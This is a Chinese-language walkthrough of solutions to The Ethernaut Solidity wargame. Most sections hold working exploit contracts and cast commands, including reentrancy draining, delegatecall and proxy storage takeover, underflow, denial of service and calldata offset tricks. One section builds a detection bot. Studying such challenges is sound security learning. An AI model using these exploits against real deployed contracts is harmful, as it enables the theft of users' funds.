# [The Ethernaut](https://ethernaut.openzeppelin.com)

一个非常有意思的网站，提供了一系列题目

以下内容(可能)省略：
- instance合约地址
- rpc url
- 私钥
- player地址

## Fallback

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Fallback} from "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
contract AttackScript is Script{
    function run() public{
        vm.startBroadcast();
        new Attack{value: 0.0000000000002 ether}().exploit();
        vm.stopBroadcast();
    }
}
contract Attack{
    Fallback public target = Fallback(payable(address()));
    constructor() payable {
        require(msg.value >= 0.000000000000002 ether);
    }
    function exploit() public{
        target.contribute{value: 0.000000000000001 ether}();
        (bool success, ) = payable(target).call{value: 0.000000000000001 ether, gas: 500000}(""); //gas要给够
        require(success, "Receive failed");
    }
}
```
但是吧，这只会让owner变成上述合约，而题目要求owner为player，即metamask里登记的账号。需要手动cast send更新owner
```sh
cast send "" "contribute()" --from "" --value 0.0000000000000011ether
cast send "" "withdraw()" --from ""
```
## Fallout

并非constructor（

```sh
cast send "" "Fal1out()" --from ""
cast send "" "collectAllocations()" --from ""
```

## Coin Flip

`block.number`是可以预测的。一个要注意的地方是，题目检查了`lastHash != blockValue`，因此两个转账之间不能太快，要给`block.number`自增的时间
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {CoinFlip} from "../src/CoinFlip.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
contract AttackScript is Script {
    function run() public { //以后若没有说明默认都是这一套(或者像上面那样加上value)，因此会省略这部分
        vm.startBroadcast();
        new Attack().exploit();
        vm.stopBroadcast();
    }
}
contract Attack {
    CoinFlip public target = CoinFlip(address());
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function exploit() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        target.flip((blockValue / FACTOR) == 1);
    }
}
```
```sh
for i in {1..10}; do
    forge script script/Attack.s.sol:AttackScript --rpc-url $ETH_RPC_URL --private-key $PRIVATE_KEY --broadcast
    sleep 15
done
```
## Telephone

简单来说，可以将`msg.sender`理解成调用函数的合约地址；而`tx.origin`是调用链的原始发起者，比如用户的钱包地址。只要用foundry来解这题（remix应该也行，但我配置不好……），两者就一定不一样
```solidity
contract Attack {
    Telephone public target = Telephone(address());
    function exploit() public {
        target.changeOwner(address());
    }
}
```
## Token

balances用uint256存储token数量，但没检查溢出
```sh
cast send "" "transfer(address,uint256)" "任意一个不等于player的地址" 21 --from ""
```
## Delegation

之前在`GlacierVault`那题见过，delegatecall的原理是：假设合约A使用delegatecall调用合约B的某个方法C，则执行方法C时内部所使用的storage是合约A而不是B的。也就是，本来方法C内部修改的是合约B的某些字段，假设在D处；但使用delegatecall后，实际修改的storage是合约A在D处的内存

这题合约`Delegation`使用delegatecall调用`Delegate`合约的函数。如果我们让调用的函数为pwn，pwn内部会设置`owner = msg.sender`。但实际改变的不是`Delegate`的owner，而是`Delegation`的owner，因为两个合约的owner字段在storage里的位置相同，且delegatecall修改的是调用者的storage

首先拿pwn函数的签名：
```sh
cast sig "pwn()"
```
然后调用delegatecall：
```sh
cast send "" "0xdd365b8b" --from ""
```
另外，在终端调用`await contract.owner()`验证owner时发现更改有延迟，输出的还是原来的值。不管，直接自信submit instance（

## Force

selfdestruct可以自毁当前合约，将全部的balance转给参数指定的地址，无视目标是否有相应的接收函数

```solidity
contract Attack {
    constructor() payable {
        require(msg.value != 0 ether);
    }
    function exploit() public {
        selfdestruct(payable(address()));
    }
}
```
## Vault

solidity里的private属性只保证了其他合约无法访问指定的字段；但实际的值仍然在链上，任何人都可以查看storage进而获取其值

```sh
cast storage "" 1
```
slot 0是locked，因此slot 1是password
```sh
cast send "" "unlock(bytes32)" "0x..."
```
## King

类似这题： https://medium.com/@Jesserc_/solidity-attack-vectors-2-dos-with-unexpected-revert-509a09e75c9f

receive函数中的逻辑有缺陷：`payable(king).transfer(msg.value)`。若king合约未实现接收的fallback函数，代码执行到这里时会失败，导致revert。自然就走不到下面的更新逻辑了
```solidity
contract Attack {
    King target = King(payable(address()));
    constructor() payable {
        require(msg.value != 0 ether);
    }
    function exploit() public {
        (bool success, ) = payable(target).call{value: 0.0010000000000001 ether, gas: 500000}("");
    }
}
```
## Re-entrancy

注意withdraw函数中先调用了`msg.sender.call`再更新`balances[msg.sender]`。call函数会调用接收者的fallback/receive函数。如果在receive里再次调用withdraw，就能重复以上步骤，直到清空目标的balance
```solidity
contract Attack {
    Reentrance target = Reentrance(payable(address()));
    constructor() public payable {
        require(msg.value != 0 ether);
    }
    function exploit() public {
        target.donate{value:0.0005 ether}(address(this));
        target.withdraw(0.0005 ether);
    }
    fallback() external payable { 
        target.withdraw(0.0005 ether);
    }
}
```
safemath库见 https://github.com/fractional-company/contracts/blob/master/src/OpenZeppelin/math/SafeMath.sol 。不过版本是`0.8.0`，需要修改Reentrance的版本到`0.8.0`才能使用

## Elevator

定义了一个接口Building，并直接将msg.sender看做接口的实现。问题是msg.sender不一定老实地实现指定的函数
```solidity
contract Attack {
    bool toggle = false;
    Elevator target = Elevator(address());
    function isLastFloor(uint256) external returns (bool) {
        toggle = !toggle;
        return !toggle;
    }
    function exploit() public {
        target.goTo(0);
    }
}
```

## Privacy

类似Vault，但是变量在storage里的布局复杂了些。规律如下：
- 变量按照声明顺序（从上到下）从 slot 0 开始依次分配
- 每个变量占用一个完整的 slot (32字节)
- 如果多个连续的小类型（小于32字节）变量可以放入一个 slot，编译器会按照从右到左(低位到高位)的顺序自动打包
- 比如uint256, int256, bytes32单独占一个slot，但uint8, bool, address等类型可以多个变量共享一个slot

这题的locked变量虽然是bool，但紧跟着一个uint256，只能单独占用一个slot（即使它只用1bit）

ID自己一个

flattening，denomination和awkwardness挤一个

data是个有三个元素的bytes32数组，占三个slot

然后是类型转换`bytes16(data[2]))`。solidity从较大的 bytes 类型转换为较小的 bytes 类型时，截取的是前面的字节（高位字节），而不是后面的字节

```sh
cast storage "" 5
```
```sh
cast send "" "unlock(bytes16)" ""
```

## Gatekeeper One

突然上难度了……

gateOne和gateThree都不是什么问题。gateOne之前见过了，gateThree找个AI分析一下即可。但是这个gateTwo，要求在执行它的时候剩余的gas正好是8191的倍数。虽然调用时可以控制传递的gas数量，但怎么知道执行gasleft之前消耗了多少gas？

我尝试在本地模拟了一个链。foundry自带的工具很多，在另一个终端运行anvil就能拿到本地链的rpc url和私钥。然后编写攻击脚本，不控制传递的gas，而是在调用enter前和enter后（在攻击函数中）均执行一次gasleft，看看两者的差值是多少
```sh
forge script script/Attack.s.sol:AttackScript \
    --fork-url http://localhost:8545 \
    --private-key "" \
    --broadcast
```
得到265。不对。到底是多少？看了[别人](https://www.cnblogs.com/WZM1230/p/18754096)的记录，正确答案是256（马后炮一下，可能是我调用函数和测量时额外多用了一些gas？或是因为这个方法只能精确到某个语句，精确不到指令？）

那就爆破吧。往前挪一下起始值，爆破`8191*10+i`，用try-catch捕捉失败的require。脚本执行成功，顺利得到256。但是submit instance发现entrant没更新？这我真不知道为啥了，try没有捕捉到错误说明三个gate中的require都通过了，enter本身也没什么好出错的。看了别人的脚本，和我逻辑差不多啊，只是没有将爆破和调用放在一个函数里，而是分成了两个函数，通过传递参数的方式制定gas。这总不会是原因吧？得试一下佬的脚本
```solidity
contract Attack {
    function test(address addr, uint256 gas) public {
        GatekeeperOne go = GatekeeperOne(addr);
        bytes8 key = bytes8(uint64(uint160(tx.origin) & 0xFFFFFFFF0000FFFF));
        require(go.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
    function exploit(address addr) public {
        for(uint256 i = 1; i < 8191; i++){
            try this.test(addr, i) {
                console.log(i);
                break;
            } catch {}
        }
    }
}
```
……成功了，但输出同样是256。不是，这是为啥啊？

## Gatekeeper Two

extcodesize不会计入合约的构造函数，因此在构造函数里执行攻击即可
```solidity
contract Attack {
    constructor() {
        GatekeeperTwo target=GatekeeperTwo(address());
        target.enter(bytes8(type(uint64).max^uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));
    }
}
```
## Naught Coin

ERC20的文档： https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md

题目覆盖了transfer的实现，但是还有个`transferFrom(address _from, address _to, uint256 _value)`可以转账。使用前需要用approve指定足够的allowance给from（即使是自己）
```sh
cast call "" "balanceOf(address)" ""
cast send "" "function approve(address, uint256)" "" 0xd3c21bcecceda1000000 
cast send "" "transferFrom(address,address,uint256)" "" "" 0xd3c21bcecceda1000000
```
## Preservation

前面已经说过了delegatecall的问题，那么这题就很明显了

题目使用的LibraryContract固定修改slot 0的内容。于是可以用setSecondTime将timeZone1Library的address覆盖成任意地址。这里我们覆盖成自己写的“LibraryContract”，但其setTime修改的是slot 2的内容，对应instance中owner的slot
```solidity
contract LibraryContract {
    uint256 storedTime1;
    uint256 storedTime2;
    uint256 storedTime;
    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
contract Attack {
    Preservation target=Preservation(address());
    function exploit() public {
        LibraryContract libraryContract = new LibraryContract();
        target.setSecondTime(uint256(uint160(address(libraryContract))));
        target.setFirstTime(uint256(uint160()));
    }
}
```
## Recovery

可以预测/计算solidity里创建的合约地址：`keccak256(address, nonce)`。其中address是创建合约的合约的地址（或发起转账的公钥地址ethereum address）；nonce是已创建的合约数量+1（或transaction nonce）

foundry自带`computeCreateAddress`函数计算地址，在script的run函数里才能调用
```solidity
contract AttackScript is Script {
    function run() public {
        vm.startBroadcast();
        SimpleToken(payable(vm.computeCreateAddress(address(),1))).destroy(payable(address()));
        vm.stopBroadcast();
    }
}
```
## MagicNumber

目标是用evm raw bytecode编写一个大小不超过10字节的合约；在调用合约的`whatIsTheMeaningOfLife`函数时返回42。这活AI最会了

最终bytecode为`602a60005260206000f3`：
```
60 2a — PUSH1 0x2a（把数字 42 压栈）

60 00 — PUSH1 0x00（压入MSTORE的参数0）

52 — MSTORE（在内存 offset 0 存入 32 字节的值 42）

60 20 — PUSH1 0x20（return bytecode的参数32）

60 00 — PUSH1 0x00（return bytecode的参数“内存偏移0”）

f3 — RETURN（返回内存 [0,32] —— 即 32 字节的 42）
```
一般的合约都有函数选择器，用于决定调用方调用的是什么函数。上述bytecode没有这段逻辑，因此并不是只有在调用`whatIsTheMeaningOfLife`时才返回42，无论调用什么都会返回42

至于为什么一定要把42存进内存里再返回，因为return指令只能返回内存区域的数据。也不能直接返回字节常量42（仅1字节），因为题目指定了返回值的类型为32字节（uint256）

```sh
cast send --create 600a600c600039600a6000f3602a60005260206000f3
```
注意`--create`指的是creation code，实际部署在链上的合约是creation code返回的内容。所以以上bytecode是返回`602a60005260206000f3`的bytecode

拿到transaction hash后在 https://sepolia.etherscan.io 可以看到创建的合约的地址

https://ethervm.io/decompile 可以用来确认编写的bytecode是否正确

## Alien Codex

动态数组在storage slot里的布局非常抽象。其“本体”只有一个长度字段，存储规则和先前说的一样，按顺序占用slot位。但是其数据部分起始于第`keccak256(abi.encode(1))`个slot（称为arrayStart），即数组索引i对应的数据存储在第`arrayStart + i`个slot

EVM共有 $2^{256}$ 个slot，如果超出这个数就会发生溢出，重新从0开始算起

假设合约B继承自合约A，slot占用的顺序是从A到B（先父合约再子合约）。从某个古老的[commit](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/be5ed7364b93daccbb74a09e3f5ec1be6c458097/contracts/ownership/Ownable.sol)中找到0.5.0版本的`Ownable.sol`后可以像这样查看AlienCodex的storage（假设文件在src下）：
```sh
forge inspect AlienCodex storage-layout
```
结果如下：
```
╭---------+-----------+------+--------+-------+-------------------------------╮
| Name    | Type      | Slot | Offset | Bytes | Contract                      |
+=============================================================================+
| _owner  | address   | 0    | 0      | 20    | src/AlienCodex.sol:AlienCodex |
|---------+-----------+------+--------+-------+-------------------------------|
| contact | bool      | 0    | 20     | 1     | src/AlienCodex.sol:AlienCodex |
|---------+-----------+------+--------+-------+-------------------------------|
| codex   | bytes32[] | 1    | 0      | 32    | src/AlienCodex.sol:AlienCodex |
╰---------+-----------+------+--------+-------+-------------------------------╯
```
目标`_owner`确实是第0个slot

利用上述溢出问题即可覆盖`_owner`

首先绕过modifer：
```sh
cast send "" "makeContact()"
```
然后调用retract函数使合约的长度-1：从0变成 $2^{256}-1$

```sh
cast send "" "retract()"
```
因为上一步我们将数组的长度变得足够大，所以revise函数能够写整个storage。计算从arrayStart到溢出需要的索引：
```sh
#必须有这么多0，不然结果不正确
cast keccak 0x0000000000000000000000000000000000000000000000000000000000000001
```
```py
print(2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
```
最后覆盖slot 0
```sh
cast send "" "revise(uint256, bytes32)" 35707666377435648211887908874984608119992236509074197713628505308453184860938 ""
```
本来想写攻击合约的，结果`forge-std`不支持0.5.0这么古老的版本，只能用foundry命令行了

## Denial

`partner.call`处未指定调用时付出的最大gas。如果一个恶意合约故意在`receive`函数中实现高gas的逻辑，可能导致剩余的gas无法支持函数后续的逻辑
```solidity
contract Attack {
    Denial target=Denial(payable(address()));
    function exploit() public {
        target.setWithdrawPartner(payable(address(this)));
    }
    receive() external payable {
        while(true) {
        }
    }
}
```
这也是为什么调用外部的call时应显式指定gas。另外，外部的call最多能使用当前gas的 $\frac{63}{64}$ ，所以如果在最开始就给足gas，使 $\frac{1}{64}$ 的gas足够覆盖剩余的逻辑，也不会出现这题的dos（denial of service）问题（但是何必呢？）

## Shop

view函数相比于普通的函数，不能修改状态变量、触发事件（Event）、发送/接收以太币、创建新合约、调用普通函数（view和pure函数除外）

问题在于Shop调用了两次price函数，给了攻击者修改返回值的时机。有点类似之前的`Elevator`，但是不能通过修改全局变量使函数返回不同的值

Shop先更新isSold再更新price,于是可以利用isSold作为开关
```solidity
contract Attack is Buyer {
    Shop target=Shop(address());
    function price() external view override returns (uint256) {
        if(target.isSold()){
            return 0;
        }
        return 101;
    }
    function exploit() public {
        target.buy();
    }
}
```
## Dex

左脚踩右脚上天了（

套一下swap函数的逻辑，发现从第二次swap开始，我们有的总token数量将越来越多：
1. 10 token1 -> 10 token2(10*100/100=10)
2. 20(10+10，原本我们自己也有10个) token2 -> 24 token1(20*110/90=24)
3. 24 token1 -> 30 token2(24*(90+20)/(110-24))
4. ...

很明显重复以上步骤后总会消耗完token1或者token2。这里我直接拿console做了
```js
let token1=await contract.token1()
let token2=await contract.token2()
await contract.approve(instance,1000) //approve可以允许对方使用大于自己balance数量的token
await contract.swap(token1,token2,10)
await contract.swap(token2,token1,20)
await contract.swap(token1,token2,24)
await contract.swap(token2,token1,30)
await contract.swap(token1,token2,41)
await contract.swap(token2,token1,45)
//最后先耗尽token1
```
## Dex Two

与Dex的源码比对，发现这题没有检查from和to是否为token1或token2。那就很好办了，自己创建一个假token作from即可
```solidity
contract MyToken is ERC20 {
    constructor(string memory name, string memory symbol)
        ERC20(name, symbol)
    {}
    function mint(address account, uint256 amount) public {
        _mint(account,amount);
    }
}
```
拿到上述合约的地址后运行：
```sh
cast send "MyToken" "mint(address,uint256)" "instance" 100
cast send "MyToken" "mint(address,uint256)" "player" 100
cast send "MyToken" "approve(address,uint256)" "instance" 1000
cast send "instance" "swap(address,address,uint256)" "MyToken" "token1" 100
cast send "MyToken" "mint(address,uint256)" "player" 200
cast send "instance" "swap(address,address,uint256)" "MyToken" "token2" 200
```
另外，我本来打算用console做这题的。结果报错：`Transaction was not mined within 50 blocks, please make sure your transaction was properly sent. Be aware that it might still be mined!`，跑去用foundry也报错:`server returned an error response: error code -32000: replacement transaction underpriced`

解决办法是等一会，一段时间后foundry就不再报错了（估计是原交易被刷掉了）

## Puzzle Wallet

看了一圈，发现根本无法调用PuzzleWallet中的任何函数，因为基本都有onlyWhitelisted或者其他的限制。PuzzleProxy里倒是有个proposeNewAdmin函数，但是PuzzleProxy这个合约在哪？

完全不知道怎么开始，只能看答案： https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet 。看起来PuzzleProxy和PuzzleWallet在同一个地址？根据UpgradeableProxy的[源码](https://github.com/fractional-company/contracts/blob/master/src/OpenZeppelin/proxy/UpgradeableProxy.sol)，所谓Proxy指的是将交互和具体实现分开的架构。用户和Proxy交互时，Proxy用delegatecall调用实现层合约的相应函数。“Upgradeable”指的是可以更改指定的实现层合约

`PuzzleWallet(address(proxy))`指的是用PuzzleWallet定义的函数API与`address(proxy)`这个地址进行交互。由于proxy并不具备PuzzleWallet的api，所以调用会走到proxy的fallback函数。proxy的fallback函数里再使用deletegatecall调用PuzzleWallet的api。给人的体验很像是“PuzzleProxy的地址等于PuzzleWallet的地址”，实际上不可能有两个合约在同一个地址

这题同样存在deletegatecall相关的漏洞。PuzzleProxy的slot 0、1分别是pendingAdmin和admin；而PuzzleWallet的slot 0、1分别是owner和maxBalance。因为是proxy使用deletegatecall调用wallet的函数，所以wallet读取和修改的storage其实是proxy的。于是我们可以用`proposeNewAdmin`修改proxy的pendingAdmin，后续wallet读取owner时读到的便是pendingAdmin的值。借此我们可以变成wallet的owner，从而调用addToWhitelist绕过onlyWhitelisted

非常可惜execute函数中不存在re-entrancy。multicall用depositCalled防止攻击者用同一个`msg.value`多次调用deposit函数。然而depositCalled是一个本地变量，如果攻击者用multicall再调用一次multicall，第二次调用的multicall的depositCalled就变回false了；允许攻击者用相同的`msg.value`再次调用deposit

利用上述multicall中的漏洞清空wallet的balance后就能用setMaxBalance修改maxBalance参数，即proxy中的admin参数了
```solidity
contract AttackScript is Script {
    function run() public {
        vm.startBroadcast();
        PuzzleProxy pp=PuzzleProxy();
        PuzzleWallet pw=PuzzleWallet();
        pp.proposeNewAdmin(msg.sender);
        pw.addToWhitelist(msg.sender);
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        multicallData[1] = abi.encodeWithSelector(
            PuzzleWallet.multicall.selector,
            depositCall
        );
        pw.multicall{value: 0.001 ether}(multicallData);
        pw.execute(msg.sender,0.002 ether,"");
        pw.setMaxBalance(uint256(uint160(msg.sender)));
        vm.stopBroadcast();
    }
}
```

## Motorbike

见 https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade

在Dencun upgrade后，selfdestruct字节码无法销毁合约（销毁后逻辑还在原处供其他合约调用），除非在创建合约的同一个转账中调用selfdestruct。这点其实可以解决，但这样解出题目的地址不是外部账号地址player，导致此题无解

Pectra upgrade后这题又变得可解了，但是多了很多与预期解无关的复杂步骤。我没跑通仓库里的代码，在调试期间甚至似乎把我的foundry环境搞坏了……显示本地nonce与远程nonce不符。我不知道怎么重置，建新project也不行。难道要用重装大法了吗（

## DoubleEntryPoint

现在看来上一道题的问题可能是代码逻辑导致的。今天没有遇见任何问题

描述说CryptoVault的underlying token是DoubleEntryPoint，这个token不应被转走；但代码中出现了一个漏洞，导致token最终可以被转走

漏洞在于CryptoVault没有过滤完全。sweepToken只保证了参数不能是DoubleEntryPointToken，但LegacyToken的transfer函数实际调用的是内部delegate的delegateTransfer，即DoubleEntryPoint的delegateTransfer，这就又绕回去了

然而这题我们的目标是防止漏洞而不是利用漏洞。这也不难，delegateTransfer有个fortaNotify修饰符，这个修饰符内部会调用用户注册的bot的handleTransaction函数；我们只要在这个函数内根据情况raiseAlert即可

区分有没有人在利用漏洞只需看origSender是否是CryptoVault
```solidity
contract AttackScript is Script {
    function run() public {
        vm.startBroadcast();
        DetectionBot bot=new DetectionBot(); //await contract.cryptoVault()
        Forta forta=Forta(address()); //await contract.forta()
        forta.setDetectionBot(address(bot));
        vm.stopBroadcast();
    }
}
contract DetectionBot {
    address immutable cryptoVault;
    constructor(address _cryptoVault) {
        cryptoVault = _cryptoVault;
    }
    function handleTransaction(address user, bytes calldata msgData) external {
        if (msgData.length >= 100) {
            address origSender = abi.decode(msgData[68:100], (address));
            if (origSender == cryptoVault) {
                Forta(msg.sender).raiseAlert(user);
            }
        }
    }
}
```
msgData的布局（相对于delegateTransfer函数）
```
[4字节]      [32字节]   [32字节]     [32字节]
┌─────────┬─────────┬───────────┬───────────┐
│selector │ to      │ value     │ origSender│
└─────────┴─────────┴───────────┴───────────┘
```
这题叫DoubleEntryPoint是因为DoubleEntryPointToken既可以用自带的transfer进行转账，也可以通过LegacyToken委托调用转账

## Good Samaritan

提示给出了这篇文章： https://www.soliditylang.org/blog/2021/04/21/custom-errors 。稍微翻了一下，重要的地方只有最后那段`Errors in Depth`。revert一个error在内存得到的字节等于用abi函数编码error的名称，这也是`keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)`的由来

如果一个函数抛出error，这个error会沿着函数调用栈一直往上走，直到遇见try-catch语句。所以我们利用transfer中调用的`INotifyable(dest_).notify(amount_)`在notify里抛出一样的错误即可
```solidity
contract Attack {
    GoodSamaritan target=GoodSamaritan(address());
    error NotEnoughBalance();
    function exploit() public {
        target.requestDonation();
    }
    function notify(uint256 amount) external { //注意transferRemainder也会调用transfer，不能无脑revert
        if(amount<=10){
            revert NotEnoughBalance();
        }
    }
}
```
## Gatekeeper Three

没有新东西，是之前见过的考点的大杂烩
```solidity
contract Attack {
    GatekeeperThree target=GatekeeperThree(payable(address()));
    constructor() payable {}
    function exploit() public {
        target.construct0r();
        target.getAllowance(); //createTrick后看trick合约的storage得到
        require(payable(target).send(0.001000001 ether), "Transaction failed");
        target.enter();
    }
}
```
## Switch

问了chatgpt calldata的编码格式：
```
calldata = function_selector(4 bytes)
            + offset_of_dynamic_arg(32 bytes)
            + dynamic_arg_length(32 bytes)
            + dynamic_arg_data(variable)

```
“dynamic”很重要，参数的起始偏移并不是固定的

回到题目的分析上。flipSwitch接收`_data`作为参数，而这个参数用来控制`address(this).call(_data)`处调用的函数

onlyOff修饰符用calldatacopy检查`msg.data`偏移68处开始的4个字节是否等于offSelector。嗯？它为什么要这样检查？参考上述编码格式，onlyOff里得到的calldata其实是调用flipSwitch的calldata，结构如下：
| 位置          | 内容                             |
| ----------- | ------------------------------ |
| 0x00 – 0x03 | `flipSwitch(bytes)` 的 selector |
| 0x04 – 0x23 | `_data` 的偏移量（一般是 0x20）         |
| 0x24 – 0x43 | `_data` 的 length               |
| 0x44 – …    | `_data` 的内容  |

68，或者说0x44，正好是`_data`的起始处。如果我们想让flipSwitch内部调用turnSwitchOn，`_data`的前4个字节（function selector的位置）就必须是turnSwitchOn，进而过不了检查

然而话又说回来，“一般是 0x20”说明“可以不是0x20”。假如我们直接用`contract.flipSwitch`调用偏移就是0x20；但如果用call底层调用，我们就能自由控制msg.data，进而修改`_data` 的内容所在的位置

以下是测试代码，放在project的test目录下，用`forge test -vv`运行。不知道为什么，我没有办法创建这题的实例（很奇怪，只有这题不行，其他题好好的），无法真正解出这题
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Interfaces.sol";

contract SwitchTest is Test {
    Switch s;

    function setUp() public {
        s = new Switch();
    }

    function testExploit() public {
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 onSel = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSel = bytes4(keccak256("turnSwitchOff()"));
        uint256 customOffset = 0x80; //其他的偏移X也行,只要X+4对应的地方记录的是data length，X+36是data起始处即可
        bytes memory calldataPrefix = abi.encodePacked(flipSelector, uint256(customOffset));
        uint256 padTo44 = 0x44 - calldataPrefix.length;
        bytes memory midPadding = new bytes(padTo44);
        bytes memory realData = abi.encodePacked(onSel);
        uint256 L = realData.length;
        bytes memory tail = abi.encodePacked(uint256(L));
        uint256 currentLen = calldataPrefix.length + midPadding.length;
        uint256 padTo80 = customOffset - currentLen;
        bytes memory padTo80Bytes = new bytes(padTo80);

        bytes memory fullCalldata = abi.encodePacked(
            calldataPrefix,
            midPadding,
            offSel,
            padTo80Bytes,
            tail,
            realData
        );
        (bool ok, ) = address(s).call(fullCalldata);
        assertTrue(ok,"Failed to call");
        assertTrue(s.switchOn(),"Failed to open the switch");
    }
}
```